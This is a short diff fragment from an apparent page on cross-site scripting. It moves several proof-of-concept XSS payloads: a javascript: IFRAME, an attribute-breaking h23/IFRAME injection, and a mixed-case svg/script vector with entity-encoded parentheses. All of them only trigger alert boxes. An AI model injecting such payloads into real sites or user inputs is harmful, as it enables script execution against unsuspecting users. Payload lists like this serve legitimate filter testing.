@@ -37,13 +37,13 @@ An attacker can use yyy to send a malicious script to an unsuspecting user. The 
 
 
 
+"><h23><IFRAME SRC="javascript:alert('yyy');"></IFRAME>">2323</h23>
 
 
 
 
 
 
-<IFRAME SRC="javascript:alert('yyy');"></IFRAME>
 "><h23><IFRAME SRC="javascript:alert('yyy');"></IFRAME>">2323</h23>
 <IFRAME SRC="javascript:alert('yyy');"></IFRAME>
 <sVg><scRipt >alert&lpar;23&rpar; {Opera}
